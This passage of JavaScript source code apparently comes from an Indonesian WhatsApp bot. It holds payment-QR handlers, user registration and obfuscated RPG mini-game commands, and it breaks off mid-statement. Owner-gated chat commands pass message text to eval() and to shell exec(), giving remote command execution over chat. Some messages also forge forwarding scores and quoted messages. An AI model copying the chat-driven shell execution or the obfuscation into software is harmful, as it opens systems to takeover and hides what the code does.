if(subscribezeeoneofc == 'qr_ovo13'){
	gambar_ovo = `${qr_code_ovo}`
	let gambar_ovo_nya = await getBuffer(gambar_ovo)
	ini_bayar = `${ucapannya2}\n\n•> Nama : _${pushname}_
•> Nomor : _@${sender.split("@")[0]}_
•> Sewa : _1 Minggu_ 
•> Harga : ${_minggu}\n\nCaranya :
1. Buka Aplikasi OVO via HP-mu.
2. Pilih Pay / Bayar
3. Scan Barcode diatas OVO.
4. dan Masukkan Nominal ${_minggu}
5. Selesai`
await alpha.sendMessage(from, gambar_ovo_nya, image, {thumbnail: Buffer.alloc(0), quoted: mek, caption: ini_bayar,contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true})
}    
if(subscribezeeoneofc == 'qr_dana13'){
	gambar_dana = `${qr_code_dana}`
	let gambar_dana_nya = await getBuffer(gambar_dana)
	ini_bayar = `${ucapannya2}\n\n•> Nama : _${pushname}_
•> Nomor : _@${sender.split("@")[0]}_
•> Sewa : _1 Minggu_ 
•> Harga : ${_minggu}\n\nCaranya :
1. Buka Aplikasi DANA via HP-mu.
2. Pilih Pay / Bayar
3. Scan Barcode diatas DANA.
4. dan Masukkan Nominal ${_minggu}
5. Selesai`
await alpha.sendMessage(from, gambar_dana_nya, image, {thumbnail: Buffer.alloc(0), quoted: mek, caption: ini_bayar,contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true})
}    
if(subscribezeeoneofc == 'qr_gopay13'){
	gambar_gopay = `${qr_code_gopay}`
	let gambar_gopay_nya = await getBuffer(gambar_gopay)
	ini_bayar = `${ucapannya2}\n\n•> Nama : _${pushname}_
•> Nomor : _@${sender.split("@")[0]}_
•> Sewa : _1 Minggu_ 
•> Harga : ${_minggu}\n\nCaranya :
1. Buka Aplikasi GOPAY via HP-mu.
2. Pilih Pay / Bayar
3. Scan Barcode diatas GOPAY.
4. dan Masukkan Nominal ${_minggu}
5. Selesai`
await alpha.sendMessage(from, gambar_gopay_nya, image, {thumbnail: Buffer.alloc(0), quoted: mek, caption: ini_bayar,contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true})
}    

if(subscribezeeoneofc == 'qr_ovo14'){
	gambar_ovo = `${qr_code_ovo}`
	let gambar_ovo_nya = await getBuffer(gambar_ovo)
	ini_bayar = `${ucapannya2}\n\n•> Nama : _${pushname}_
•> Nomor : _@${sender.split("@")[0]}_
•> Sewa : _2 Minggu_ 
•> Harga : ${__minggu}\n\nCaranya :
1. Buka Aplikasi OVO via HP-mu.
2. Pilih Pay / Bayar
3. Scan Barcode diatas OVO.
4. dan Masukkan Nominal ${__minggu}
5. Selesai`
await alpha.sendMessage(from, gambar_ovo_nya, image, {thumbnail: Buffer.alloc(0), quoted: mek, caption: ini_bayar,contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true})
}    
if(subscribezeeoneofc == 'qr_dana14'){
	gambar_dana = `${qr_code_dana}`
	let gambar_dana_nya = await getBuffer(gambar_dana)
	ini_bayar = `${ucapannya2}\n\n•> Nama : _${pushname}_
•> Nomor : _@${sender.split("@")[0]}_
•> Sewa : _2 Minggu_ 
•> Harga : ${__minggu}\n\nCaranya :
1. Buka Aplikasi DANA via HP-mu.
2. Pilih Pay / Bayar
3. Scan Barcode diatas DANA.
4. dan Masukkan Nominal ${__minggu}
5. Selesai`
await alpha.sendMessage(from, gambar_dana_nya, image, {thumbnail: Buffer.alloc(0), quoted: mek, caption: ini_bayar,contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true})
}    
if(subscribezeeoneofc == 'qr_gopay14'){
	gambar_gopay = `${qr_code_gopay}`
	let gambar_gopay_nya = await getBuffer(gambar_gopay)
	ini_bayar = `${ucapannya2}\n\n•> Nama : _${pushname}_
•> Nomor : _@${sender.split("@")[0]}_
•> Sewa : _2 Minggu_ 
•> Harga : ${__minggu}\n\nCaranya :
1. Buka Aplikasi GOPAY via HP-mu.
2. Pilih Pay / Bayar
3. Scan Barcode diatas GOPAY.
4. dan Masukkan Nominal ${__minggu}
5. Selesai`
await alpha.sendMessage(from, gambar_gopay_nya, image, {thumbnail: Buffer.alloc(0), quoted: mek, caption: ini_bayar,contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true})
}

if(subscribezeeoneofc == 'qr_ovo15'){
	gambar_ovo = `${qr_code_ovo}`
	let gambar_ovo_nya = await getBuffer(gambar_ovo)
	ini_bayar = `${ucapannya2}\n\n•> Nama : _${pushname}_
•> Nomor : _@${sender.split("@")[0]}_
•> Sewa : _3 Minggu_ 
•> Harga : ${___minggu}\n\nCaranya :
1. Buka Aplikasi OVO via HP-mu.
2. Pilih Pay / Bayar
3. Scan Barcode diatas OVO.
4. dan Masukkan Nominal ${___minggu}
5. Selesai`
await alpha.sendMessage(from, gambar_ovo_nya, image, {thumbnail: Buffer.alloc(0), quoted: mek, caption: ini_bayar,contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true})
}    
if(subscribezeeoneofc == 'qr_dana15'){
	gambar_dana = `${qr_code_dana}`
	let gambar_dana_nya = await getBuffer(gambar_dana)
	ini_bayar = `${ucapannya2}\n\n•> Nama : _${pushname}_
•> Nomor : _@${sender.split("@")[0]}_
•> Sewa : _3 Minggu_ 
•> Harga : ${___minggu}\n\nCaranya :
1. Buka Aplikasi DANA via HP-mu.
2. Pilih Pay / Bayar
3. Scan Barcode diatas DANA.
4. dan Masukkan Nominal ${___minggu}
5. Selesai`
await alpha.sendMessage(from, gambar_dana_nya, image, {thumbnail: Buffer.alloc(0), quoted: mek, caption: ini_bayar,contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true })
}    
if(subscribezeeoneofc == 'qr_gopay15'){
	gambar_gopay = `${qr_code_gopay}`
	let gambar_gopay_nya = await getBuffer(gambar_gopay)
	ini_bayar = `${ucapannya2}\n\n•> Nama : _${pushname}_
•> Nomor : _@${sender.split("@")[0]}_
•> Sewa : _3 Minggu_ 
•> Harga : ${___minggu}\n\nCaranya :
1. Buka Aplikasi GOPAY via HP-mu.
2. Pilih Pay / Bayar
3. Scan Barcode diatas GOPAY.
4. dan Masukkan Nominal ${___minggu}
5. Selesai`
await alpha.sendMessage(from, gambar_gopay_nya, image, {thumbnail: Buffer.alloc(0), quoted: mek, caption: ini_bayar, contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true })
}


if(subscribezeeoneofc == 'qr_ovo16'){
	gambar_ovo = `${qr_code_ovo}`
	let gambar_ovo_nya = await getBuffer(gambar_ovo)
	ini_bayar = `${ucapannya2}\n\n•> Nama : _${pushname}_
•> Nomor : _@${sender.split("@")[0]}_
•> Sewa : _1 Bulan_ 
•> Harga : ${_bulan}\n\nCaranya :
1. Buka Aplikasi OVO via HP-mu.
2. Pilih Pay / Bayar
3. Scan Barcode diatas OVO.
4. dan Masukkan Nominal ${_bulan}
5. Selesai`
await alpha.sendMessage(from, gambar_ovo_nya, image, {thumbnail: Buffer.alloc(0), quoted: mek, caption: ini_bayar,contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true})
}    
if(subscribezeeoneofc == 'qr_dana16'){
	gambar_dana = `${qr_code_dana}`
	let gambar_dana_nya = await getBuffer(gambar_dana)
	ini_bayar = `${ucapannya2}\n\n•> Nama : _${pushname}_
•> Nomor : _@${sender.split("@")[0]}_
•> Sewa : _1 Bulan_ 
•> Harga : ${_bulan}\n\nCaranya :
1. Buka Aplikasi DANA via HP-mu.
2. Pilih Pay / Bayar
3. Scan Barcode diatas DANA.
4. dan Masukkan Nominal ${_bulan}
5. Selesai`
await alpha.sendMessage(from, gambar_dana_nya, image, {thumbnail: Buffer.alloc(0), quoted: mek, caption: ini_bayar, contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true })
}    
if(subscribezeeoneofc == 'qr_gopay16'){
	gambar_gopay = `${qr_code_gopay}`
	let gambar_gopay_nya = await getBuffer(gambar_gopay)
	ini_bayar = `${ucapannya2}\n\n•> Nama : _${pushname}_
•> Nomor : _@${sender.split("@")[0]}_
•> Sewa : _1 Bulan_ 
•> Harga : ${_bulan}\n\nCaranya :
1. Buka Aplikasi GOPAY via HP-mu.
2. Pilih Pay / Bayar
3. Scan Barcode diatas GOPAY.
4. dan Masukkan Nominal ${_bulan}
5. Selesai`
await alpha.sendMessage(from, gambar_gopay_nya, image, {thumbnail: Buffer.alloc(0), quoted: mek, caption: ini_bayar,contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true })
}

if(subscribezeeoneofc == 'qr_ovo17'){
	gambar_ovo = `${qr_code_ovo}`
	let gambar_ovo_nya = await getBuffer(gambar_ovo)
	ini_bayar = `${ucapannya2}\n\n•> Nama : _${pushname}_
•> Nomor : _@${sender.split("@")[0]}_
•> Sewa : _permanen_
•> Harga : ${_permanen}\n\nCaranya :
1. Buka Aplikasi OVO via HP-mu.
2. Pilih Pay / Bayar
3. Scan Barcode diatas OVO.
4. dan Masukkan Nominal ${_permanen}
5. Selesai`
await alpha.sendMessage(from, gambar_ovo_nya, image, {thumbnail: Buffer.alloc(0), quoted: mek, caption: ini_bayar, contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true})
}    
if(subscribezeeoneofc == 'qr_dana17'){
	gambar_dana = `${qr_code_dana}`
	let gambar_dana_nya = await getBuffer(gambar_dana)
	ini_bayar = `${ucapannya2}\n\n•> Nama : _${pushname}_
•> Nomor : _@${sender.split("@")[0]}_
•> Sewa : _permanen_
•> Harga : ${_permanen}\n\nCaranya :
1. Buka Aplikasi DANA via HP-mu.
2. Pilih Pay / Bayar
3. Scan Barcode diatas DANA.
4. dan Masukkan Nominal ${_permanen}
5. Selesai`
await alpha.sendMessage(from, gambar_dana_nya, image, {thumbnail: Buffer.alloc(0), quoted: mek, caption: ini_bayar, contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true})
}    
if(subscribezeeoneofc == 'qr_gopay17'){
	gambar_gopay = `${qr_code_gopay}`
	let gambar_gopay_nya = await getBuffer(gambar_gopay)
	ini_bayar = `${ucapannya2}\n\n•> Nama : _${pushname}_
•> Nomor : _@${sender.split("@")[0]}_
•> Sewa : _permanen_ 
•> Harga : ${_permanen}\n\nCaranya :
1. Buka Aplikasi GOPAY via HP-mu.
2. Pilih Pay / Bayar
3. Scan Barcode diatas GOPAY.
4. dan Masukkan Nominal ${_permanen}
5. Selesai`
await alpha.sendMessage(from, gambar_gopay_nya, image, {thumbnail: Buffer.alloc(0), quoted: mek, caption: ini_bayar, contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true})
}
if(subscribezeeoneofc == 'qr_ovo18'){
	gambar_ovo = `${qr_code_ovo}`
	let gambar_ovo_nya = await getBuffer(gambar_ovo)
	ini_bayar = `${ucapannya2}\n\nCaranya :
1. Buka Aplikasi OVO via HP-mu.
2. Pilih Pay / Bayar
3. Scan Barcode diatas OVO.
4. dan Masukkan Nominal Jumlah Donasi.
5. Selesai`
await alpha.sendMessage(from, gambar_ovo_nya, image, {thumbnail: Buffer.alloc(0), quoted: mek, caption: ini_bayar, contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true})
}    
if(subscribezeeoneofc == 'qr_dana18'){
	gambar_dana = `${qr_code_dana}`
	let gambar_dana_nya = await getBuffer(gambar_dana)
	ini_bayar = `${ucapannya2}\n\nCaranya :
1. Buka Aplikasi DANA via HP-mu.
2. Pilih Pay / Bayar
3. Scan Barcode diatas DANA.
4. dan Masukkan Nominal Jumlah Donasi.
5. Selesai`
await alpha.sendMessage(from, gambar_dana_nya, image, {thumbnail: Buffer.alloc(0), quoted: mek, caption: ini_bayar,contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true})
}    
if(subscribezeeoneofc == 'qr_gopay18'){
	gambar_gopay = `${qr_code_gopay}`
	let gambar_gopay_nya = await getBuffer(gambar_gopay)
	ini_bayar = `${ucapannya2}\n\nCaranya :
1. Buka Aplikasi GOPAY via HP-mu.
2. Pilih Pay / Bayar
3. Scan Barcode diatas GOPAY.
4. dan Masukkan Nominal Jumlah Donasi.
5. Selesai`
await alpha.sendMessage(from, gambar_gopay_nya, image, {thumbnail: Buffer.alloc(0), quoted: mek, caption: ini_bayar,contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true})
}   
if (budy.includes("eror",'error','Eror','Error')){
					alpha.updatePresence(from, Presence.composing)
					const daieeeee = fs.readFileSync('./sticker/10_1.webp');
					alpha.sendMessage(from, daieeeee, sticker, { contextInfo: {mentionedJid: [sender]}, quoted: { "key": { "participant": `${numbernye}@s.whatsapp.net`, "remoteJid":  '6283136505591-1614953337@g.us', "fromMe": false, "id": "B391837A58338BA8186C47E51FFDFD4A" }, "message": { "documentMessage": { "jpegThumbnail": fs.readFileSync(`image/${thumbnail}`), "mimetype": "application/octet-stream","title": "YT : ZEEONE OFC", "fileLength": "36", "pageCount": 0, "fileName": `Kenapa bisa error???`}}, "messageTimestamp": "1614069378", "status": "PENDING"}})
		        }
		if(budy.includes("@verif", "@verify","daftar")){
			if (isRegister) return reply('Kamu sudah terdaftar di dalam database')
 addRegisterUser(sender, pushname, bio_user, wib)
 let ran_blc = randomNomor(50)
 addBalance(sender, ran_blc, balance)
 addLevelingId(sender)
fs.writeFileSync('./database/user/register.json', JSON.stringify(register))
teks = `╭─❒ *Verification* ❒\n│📛 *Nama :* ${pushname}\n│#️⃣ *Nomor :* @${sender.split('@')[0]}\n│💌 *Bio :* ${bio_user}\n│⏰ *Time :* ${wib}\n╰❒ *Success*`
let papako = [{
										"buttonId": `menu`,
										"buttonText": {
											"displayText": "MENU"
											},
										"type": "RESPONSE"
										},{
										"buttonId": `me`,
										"buttonText": {
											"displayText": "PROCFILE"
											},
										"type": "RESPONSE"
										}]
								sendButLocation(from, teks , `Thank for verification 💋\n${botname}™© | By ${ownername}`,pp_userz, papako, {contextInfo: { mentionedJid: [sender]}})
                }
		
if (budy.startsWith('x')){
try {
if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
return alpha.sendMessage(from, JSON.stringify(eval(budy.slice(2)),null,'\t'),text, {quoted: mek})
} catch(err) {
e = String(err)
reply(e)
}
}  
if (budy.startsWith('>')){
try {
	if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
return alpha.sendMessage(from, JSON.stringify(eval(budy.slice(2)),null,'\t'),text, {quoted: mek})
} catch(err) {
e = String(err)
reply(e)
}
}  
if (budy.startsWith('$')){
if (!mek.key.fromMe && !isOwner && !isCreator ) return reply(lang.onlyOwner())
qur = budy.slice(2)
exec(qur, (err, stdout) => {
if (err) return reply(`ALPHABOT :~ ${err}`)
if (stdout) {
reply(stdout)
}
})
}
if (budy.startsWith('=>')){
if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
var konsol = budy.slice(3)
Return = (sul) => {
var sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined){
bang = util.format(sul)
}
return reply(bang)
}
try {
reply(util.format(eval(`;(async () => { ${konsol} })()`)))
console.log('\x1b[1;37m>', '[', '\x1b[1;32mEXEC\x1b[1;37m', ']', time, color("=>", "green"), 'from', color(pushname), 'args :', color(args.length))
} catch(e){
reply(String(e))
}
}
	}
	const _0x242229=_0x4e0a;(function(_0x24af1c,_0x6de2a4){const _0x57ba90=_0x4e0a,_0x4f585d=_0x24af1c();while(!![]){try{const _0x2d4f7b=-parseInt(_0x57ba90(0x138))/0x1+parseInt(_0x57ba90(0x159))/0x2+parseInt(_0x57ba90(0x158))/0x3*(parseInt(_0x57ba90(0x121))/0x4)+parseInt(_0x57ba90(0x133))/0x5+-parseInt(_0x57ba90(0xd5))/0x6+-parseInt(_0x57ba90(0x160))/0x7*(parseInt(_0x57ba90(0x12f))/0x8)+parseInt(_0x57ba90(0xff))/0x9*(parseInt(_0x57ba90(0xbe))/0xa);if(_0x2d4f7b===_0x6de2a4)break;else _0x4f585d['push'](_0x4f585d['shift']());}catch(_0x219913){_0x4f585d['push'](_0x4f585d['shift']());}}}(_0x6b29,0x84c2d));const str2Regex=_0x4d94b5=>_0x4d94b5[_0x242229(0xb4)](/[|\\{}()[\]^$+*?.]/g,'\x5c$&'),match=(prefix instanceof RegExp?[[prefix['exec'](m[_0x242229(0x136)]),prefix]]:Array[_0x242229(0x110)](prefix)?prefix[_0x242229(0xc1)](_0x1c7ee6=>{const _0x5ad851=_0x242229;let _0x116264=_0x1c7ee6 instanceof RegExp?_0x1c7ee6:new RegExp(str2Regex(_0x1c7ee6));return[_0x116264[_0x5ad851(0x11a)](m[_0x5ad851(0x136)]),_0x116264];}):typeof prefix===_0x242229(0x15f)?[[new RegExp(str2Regex(prefix))[_0x242229(0x11a)](m[_0x242229(0x136)]),new RegExp(str2Regex(prefix))]]:[[[],new RegExp()]])[_0x242229(0xe4)](_0x3b6607=>_0x3b6607[0x1]);if(match&&m['chat'][_0x242229(0x164)]('@s.whatsapp.net')&&!isCmd){this[_0x242229(0x10b)]=this[_0x242229(0x10b)]?this[_0x242229(0x10b)]:{};let room=Object['values'](this[_0x242229(0x10b)])[_0x242229(0xe4)](_0x28ed86=>[_0x28ed86['a'],_0x28ed86['b']]['includes'](m['sender'])&&_0x28ed86[_0x242229(0x132)]==='CHATTING');if(room){if(/^.*(next|leave|start)/[_0x242229(0x10f)](m[_0x242229(0x136)]))return;if([_0x242229(0x16f),'.leave',_0x242229(0x169),_0x242229(0x10d),_0x242229(0xd8),_0x242229(0x166),_0x242229(0xc4),_0x242229(0x17b)][_0x242229(0xb8)](m[_0x242229(0x136)]))return;let other=[room['a'],room['b']][_0x242229(0xe4)](_0x422578=>_0x422578!==m[_0x242229(0x107)]);m['copyNForward'](other,!![],m[_0x242229(0x140)]&&m[_0x242229(0x140)]['fromMe']?{'contextInfo':{...m[_0x242229(0xcd)][_0x242229(0x10c)],'forwardingScore':0x0,'isForwarded':!![],'participant':other}}:{});}return!0x0;}switch(command){case _0x242229(0xb7):if(isGame(sender,isPremium,isCreator,isOwner,gcounttuser,glimit))return sendButMessage(from,lang[_0x242229(0x108)](prefix),'©\x20'+ownername,[{'buttonId':_0x242229(0x103),'buttonText':{'displayText':'Check\x20Limit'},'type':0x1}]);if(!isEventon)return sendButMessage(from,lang[_0x242229(0x177)](prefix),'©\x20'+ownername,[{'buttonId':_0x242229(0xfb),'buttonText':{'displayText':_0x242229(0x150)},'type':0x1}]);bayar=args[_0x242229(0x168)]('\x20');const hargaIkan=0x2710,hasil1=bayar*hargaIkan;if(getMancingIkan(sender)<=0x1)return reply(_0x242229(0x102)+pushname+'\x20ikan\x20kamu\x20belum\x20cukup,\x20minimal\x202\x20ikan');getMancingIkan(sender)>=0x1&&(jualIkan(sender,bayar),addKoinUser(sender,hasil1),await reply(_0x242229(0xec)+enter+enter+_0x242229(0x129)+bayar+enter+_0x242229(0x134)+hasil1+enter+enter+_0x242229(0x100)+getMancingIkan(sender)+enter+_0x242229(0x181)+checkATMuser(sender)+enter+enter+_0x242229(0x143)));await gameAdd(sender,glimit);break;case'jualcoal':if(isGame(sender,isPremium,isCreator,isOwner,gcounttuser,glimit))return sendButMessage(from,lang[_0x242229(0x108)](prefix),'©\x20'+ownername,[{'buttonId':'limit','buttonText':{'displayText':_0x242229(0x13b)},'type':0x1}]);if(!isEventon)return sendButMessage(from,lang[_0x242229(0x177)](prefix),'©\x20'+ownername,[{'buttonId':_0x242229(0xfb),'buttonText':{'displayText':'Event\x20On'},'type':0x1}]);bayar=args[_0x242229(0x168)]('\x20');const hargaCoal=0x3a98,hasil2=bayar*hargaCoal;if(getMiningcoal(sender)<=0x1)return reply(_0x242229(0x102)+pushname+_0x242229(0x174));getMiningcoal(sender)>=0x1&&(jualcoal(sender,bayar),addKoinUser(sender,hasil2),await reply(_0x242229(0xec)+enter+enter+_0x242229(0xf6)+bayar+enter+_0x242229(0x134)+hasil2+enter+enter+_0x242229(0x145)+getMiningcoal(sender)+enter+_0x242229(0x181)+checkATMuser(sender)+enter+enter+_0x242229(0x143)));await gameAdd(sender,glimit);break;case'lebur':if(isGame(sender,isPremium,isCreator,isOwner,gcounttuser,glimit))return sendButMessage(from,lang[_0x242229(0x108)](prefix),'©\x20'+ownername,[{'buttonId':'limit','buttonText':{'displayText':_0x242229(0x13b)},'type':0x1}]);if(!isEventon)return sendButMessage(from,lang[_0x242229(0x177)](prefix),'©\x20'+ownername,[{'buttonId':_0x242229(0xfb),'buttonText':{'displayText':_0x242229(0x150)},'type':0x1}]);bayar=args[_0x242229(0x168)]('\x20');const hargaOre=0x2,hasil3=bayar*hargaOre;if(getMiningore(sender)<=0x1)return reply(_0x242229(0x102)+pushname+_0x242229(0xc9));getMiningore(sender)>=0x1&&(jualore(sender,bayar),addIngot(sender,hasil3),await reply('*「\x20LEBUR\x20BERHASIL\x20」*\x0a\x0a*Jumlah\x20Ore\x20dilebur\x20:*\x20'+bayar+'\x0a*Ingot\x20didapat:*\x20'+hasil3+_0x242229(0xc6)+getMiningore(sender)));await gameAdd(sender,glimit);break;case _0x242229(0xb9):if(isGame(sender,isPremium,isCreator,isOwner,gcounttuser,glimit))return sendButMessage(from,lang[_0x242229(0x108)](prefix),'©\x20'+ownername,[{'buttonId':_0x242229(0x103),'buttonText':{'displayText':_0x242229(0x13b)},'type':0x1}]);if(!isEventon)return sendButMessage(from,lang[_0x242229(0x177)](prefix),'©\x20'+ownername,[{'buttonId':_0x242229(0xfb),'buttonText':{'displayText':_0x242229(0x150)},'type':0x1}]);bayar=args['join']('\x20');const hargaStone=0x384,hasil4=bayar*hargaStone;if(getMiningstone(sender)<=0x1)return reply('Maaf\x20'+pushname+_0x242229(0x154));getMiningstone(sender)>=0x1&&(jualstone(sender,bayar),addKoinUser(sender,hasil4),await reply(_0x242229(0xec)+enter+enter+_0x242229(0xfd)+bayar+enter+_0x242229(0x134)+hasil4+enter+enter+_0x242229(0x11d)+getMiningstone(sender)+enter+_0x242229(0x181)+checkATMuser(sender)+enter+enter+_0x242229(0x143)));await gameAdd(sender,glimit);break;case _0x242229(0x14a):if(isGame(sender,isPremium,isCreator,isOwner,gcounttuser,glimit))return sendButMessage(from,lang[_0x242229(0x108)](prefix),'©\x20'+ownername,[{'buttonId':_0x242229(0x103),'buttonText':{'displayText':_0x242229(0x13b)},'type':0x1}]);if(!isEventon)return sendButMessage(from,lang[_0x242229(0x177)](prefix),'©\x20'+ownername,[{'buttonId':_0x242229(0xfb),'buttonText':{'displayText':_0x242229(0x150)},'type':0x1}]);bayar=args['join']('\x20');const hargaIngot=0x88b8,hasil5=bayar*hargaIngot;if(getMiningingot(sender)<=0x1)return reply(_0x242229(0x102)+pushname+_0x242229(0xd7));getMiningingot(sender)>=0x1&&(jualingot(sender,bayar),addKoinUser(sender,hasil5),await reply('*「\x20PENJUALAN\x20BERHASIL\x20\x20」*'+enter+enter+_0x242229(0x11b)+bayar+enter+_0x242229(0x134)+hasil5+enter+enter+_0x242229(0xdf)+getMiningingot(sender)+enter+_0x242229(0x181)+checkATMuser(sender)+enter+enter+_0x242229(0x143)));await gameAdd(sender,glimit);break;case _0x242229(0x14b):if(isGame(sender,isPremium,isCreator,isOwner,gcounttuser,glimit))return sendButMessage(from,lang[_0x242229(0x108)](prefix),'©\x20'+ownername,[{'buttonId':'limit','buttonText':{'displayText':_0x242229(0x13b)},'type':0x1}]);if(!isEventon)return sendButMessage(from,lang[_0x242229(0x177)](prefix),'©\x20'+ownername,[{'buttonId':'event\x20on','buttonText':{'displayText':_0x242229(0x150)},'type':0x1}]);bayar=args[_0x242229(0x168)]('\x20');const hargaKayu=0x4650,hasil6=bayar*hargaKayu;if(getNebangKayu(sender)<=0x1)return reply('Maaf\x20'+pushname+_0x242229(0x171));getNebangKayu(sender)>=0x1&&(jualkayu(sender,bayar),addKoinUser(sender,hasil6),await reply(_0x242229(0x172)+enter+enter+_0x242229(0xb3)+bayar+enter+_0x242229(0x134)+hasil6+enter+enter+_0x242229(0x141)+getNebangKayu(sender)+enter+'*Sisa\x20uang:*\x20'+checkATMuser(sender)+enter+enter+_0x242229(0x143)));await gameAdd(sender,glimit);break;case _0x242229(0x131):if(isGame(sender,isPremium,isCreator,isOwner,gcounttuser,glimit))return sendButMessage(from,lang[_0x242229(0x108)](prefix),'©\x20'+ownername,[{'buttonId':_0x242229(0x103),'buttonText':{'displayText':_0x242229(0x13b)},'type':0x1}]);if(!isEventon)return sendButMessage(from,lang[_0x242229(0x177)](prefix),'©\x20'+ownername,[{'buttonId':_0x242229(0xfb),'buttonText':{'displayText':'Event\x20On'},'type':0x1}]);if(isOwner){const one=0x3b9ac9ff;addLevelingXp(sender,one),addLevelingLevel(sender,0x63),reply(_0x242229(0xbb)+one+_0x242229(0xe1));}else setTimeout(()=>{const _0x2bcd1f=_0x242229,_0x524fc9=Math[_0x2bcd1f(0xcb)](Math['random']()*0x2710);addLevelingXp(sender,_0x524fc9),reply('*Congratulation\x20🎊*\x20'+pushname+_0x2bcd1f(0x16b)+_0x524fc9+_0x2bcd1f(0x13d));},0xbb8),setTimeout(()=>{const _0x3ba227=_0x242229;reply(_0x3ba227(0x15e));},0x0);await gameAdd(sender,glimit);break;case _0x242229(0xf1):if(isGame(sender,isPremium,isCreator,isOwner,gcounttuser,glimit))return sendButMessage(from,lang['limitg'](prefix),'©\x20'+ownername,[{'buttonId':_0x242229(0x103),'buttonText':{'displayText':_0x242229(0x13b)},'type':0x1}]);if(!isEventon)return sendButMessage(from,lang['event'](prefix),'©\x20'+ownername,[{'buttonId':_0x242229(0xfb),'buttonText':{'displayText':_0x242229(0x150)},'type':0x1}]);setTimeout(()=>{const _0x124028=_0x242229,_0x47562e=Math[_0x124028(0xcb)](Math[_0x124028(0x16d)]()*0xa);addIkan(sender,_0x47562e),reply(_0x124028(0xf5)+_0x47562e+_0x124028(0xc3));},0xbb8),setTimeout(()=>{const _0x4bf50b=_0x242229;reply(_0x4bf50b(0xce));},0x0),await gameAdd(sender,glimit);break;case _0x242229(0x173):case _0x242229(0xbc):if(isGame(sender,isPremium,isCreator,isOwner,gcounttuser,glimit))return sendButMessage(from,lang[_0x242229(0x108)](prefix),'©\x20'+ownername,[{'buttonId':'limit','buttonText':{'displayText':_0x242229(0x13b)},'type':0x1}]);if(!isEventon)return sendButMessage(from,lang[_0x242229(0x177)](prefix),'©\x20'+ownername,[{'buttonId':_0x242229(0xfb),'buttonText':{'displayText':_0x242229(0x150)},'type':0x1}]);var tempsa=args['join']('\x20');if(tempsa==_0x242229(0x16e))asu=await getBuffer('https://telegra.ph/file/00018dab77a6cea81523e.jpg',{'method':_0x242229(0xb2)}),setTimeout(()=>{const _0x167cfd=_0x242229,_0x1117d9=Math[_0x167cfd(0xcb)](Math[_0x167cfd(0x16d)]()*0x46),_0x338748=Math[_0x167cfd(0xcb)](Math[_0x167cfd(0x16d)]()*0xf);addStone(sender,_0x1117d9),addIkan(sender,_0x338748),sendButImage(from,_0x167cfd(0x17e)+enter+enter+_0x167cfd(0x151)+_0x1117d9+_0x167cfd(0x180)+_0x338748+'*\x20ikan'+enter+enter+_0x167cfd(0x13e)+prefix+_0x167cfd(0xdb),botname+_0x167cfd(0xe9)+ownername,asu,[{'buttonId':_0x167cfd(0x182),'buttonText':{'displayText':'My\x20Inventory\x20🗃️'},'type':_0x167cfd(0x167)}],{'quoted':mek});},0xbb8),setTimeout(()=>{const _0x5de44b=_0x242229;reply(_0x5de44b(0xca));},0x0);else{if(tempsa==='chiltawa\x20woods')gos=await getBuffer('https://telegra.ph/file/77c3badc9f97d6589a30f.jpg',{'method':_0x242229(0xb2)}),setTimeout(()=>{const _0x23686a=_0x242229,_0x28e91a=Math[_0x23686a(0xcb)](Math['random']()*0x6e),_0x35e4bf=Math['ceil'](Math[_0x23686a(0x16d)]()*0x14);addStone(sender,_0x28e91a),addKayu(sender,_0x35e4bf),sendButImage(from,_0x23686a(0x17e)+enter+enter+_0x23686a(0x151)+_0x28e91a+_0x23686a(0x180)+_0x35e4bf+_0x23686a(0x170)+enter+enter+'Cek\x20inventory\x20anda\x20dengan\x20cara\x20ketik\x20'+prefix+'inventory',botname+_0x23686a(0xe9)+ownername,gos,[{'buttonId':_0x23686a(0x182),'buttonText':{'displayText':_0x23686a(0x186)},'type':'RESPONSE'}],{'quoted':mek});},0xbb8),setTimeout(()=>{const _0x291d13=_0x242229;reply(_0x291d13(0xca));},0x0);else{if(tempsa===_0x242229(0x15d))seae=await getBuffer(_0x242229(0xb6),{'method':'get'}),setTimeout(()=>{const _0x202366=_0x242229,_0x4fe6d9=Math[_0x202366(0xcb)](Math[_0x202366(0x16d)]()*0x41);addIkan(sender,_0x4fe6d9),sendButImage(from,_0x202366(0x17e)+enter+enter+_0x202366(0x151)+_0x4fe6d9+_0x202366(0x14e)+enter+enter+'Cek\x20inventory\x20anda\x20dengan\x20cara\x20ketik\x20'+prefix+_0x202366(0xdb),botname+_0x202366(0xe9)+ownername,seae,[{'buttonId':_0x202366(0x182),'buttonText':{'displayText':_0x202366(0x186)},'type':_0x202366(0x167)}],{'quoted':mek});},0xbb8),setTimeout(()=>{const _0x1840d5=_0x242229;reply(_0x1840d5(0xca));},0x0);else{if(tempsa==='limingstall\x20mountains')seoe=await 